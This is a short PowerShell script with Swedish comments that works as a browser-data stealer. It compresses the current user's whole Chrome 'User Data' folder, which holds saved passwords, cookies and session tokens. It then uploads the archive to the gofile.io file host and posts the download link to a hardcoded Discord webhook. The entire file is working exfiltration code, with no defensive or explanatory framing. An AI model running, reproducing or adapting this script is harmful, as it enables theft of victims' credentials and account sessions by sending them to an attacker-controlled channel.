Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome\User Data" -DestinationPath "$env:temp\temp.zip" -Force

# Lägg till filen i ett hashtable (Multipart/form-data)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12





$rawResponse = (New-Object System.Net.WebClient).UploadFile("https://upload.gofile.io/uploadfile", "$env:temp\temp.zip")
$gofile = [System.Text.Encoding]::UTF8.GetString($rawResponse) | ConvertFrom-Json

# Skapa det meddelande som din webhook faktiskt förväntar sig
$JsonPayload = @{ content = "Här är din fil: $($gofile.data.downloadPage)" } | ConvertTo-Json







# Byt ut mot din faktiska webhook-URL från Discord
$WebhookUrl = "https://discord.com/api/webhooks/1562163056358989930/a-ZW7q-A3ekHBXZN2GUoAgnVy5B9ZQ2tQQqGDlINUDrGv_DevTKve5cR6qvGMg-C2g5C"


Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonPayload -ContentType "application/json; charset=utf-8"

